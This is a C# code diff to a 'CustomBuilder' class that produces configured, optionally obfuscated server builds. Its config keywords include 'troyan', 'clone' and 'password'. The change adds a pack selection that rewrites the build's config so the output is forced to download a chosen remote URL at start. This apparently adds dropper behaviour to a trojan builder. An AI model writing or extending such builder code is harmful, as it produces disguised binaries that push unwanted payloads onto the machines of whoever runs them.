@@ -24,6 +24,7 @@ public abstract partial class CustomBuilder
     
     private ServerService Svc;
     protected ServerModel Model = new();
+    protected PackItem? PackItem = null;
     private List<SourceFile> SourceFiles = new();
     private List<SourceFile> DoFiles => SourceFiles
         .Where(a=> a.IsDo == true).ToList();
@@ -36,11 +37,13 @@ public abstract partial class CustomBuilder
     
     public bool IsObfuscate => (Program.ObfuscateDebug && IsDebug) || (Program.ObfuscateRelease && !IsDebug);
     
-    public virtual List<string> Build(string server)
+    public virtual List<string> Build(string server, string packId)
     {
         Svc = new ServerService();
         var srv = Svc.GetServer(server, true, ServerService.Get.RaiseError, "", "");
         Model = srv.ServerModel!;
+        if (!string.IsNullOrWhiteSpace(packId))
+            PackItem = Model.Pack.Items.FirstOrDefault(a=> a.Index == packId);
         MakeConsts();
         InternalBuild(server);
         SourceFiles = GetSourceFiles();
@@ -72,7 +75,7 @@ public abstract partial class CustomBuilder
     {
         
     }
-    
+
     private void MakeConsts()
     {
         var template = @"
@@ -83,14 +86,28 @@ _SERVER
 
         var keywords = new List<string>
         {
-            "Dir","holder","body","operation", "troyan","clone", "dnSponsor", "ftp", "user", "alias","_operate","StatusLabel",
+            "Dir", "holder", "body", "operation", "troyan", "clone", "pack", "post", "dnSponsor", "ftp", "user",
+            "alias", "_operate", "StatusLabel",
             "login", "password", "ico", "domainController",
             "interfaces", "bux", "landing", "php", "domainIp"
         };
+        
+        var tempFile = Path.GetTempFileName();
+        System.IO.File.Copy(Model.UserServerFile, tempFile, true);
+        if (this.PackItem != null)
+        {
+            var m = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(tempFile), ServerService.JSO)!;
+            m.StartDownloadsForce = true;
+            m.StartDownloads = new List<string>() { this.PackItem.OriginalUrl };
+            File.WriteAllText(tempFile,
+                JsonSerializer.Serialize(m, ServerService.JSO));
+        }
 
-        var serverFilePath = Model.UserServerFile;
+        var serverFilePath = tempFile;
         var serverJson = File.ReadAllText(serverFilePath);
         var server = JsonNode.Parse(serverJson)!;
+
+    
 
         JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
         {
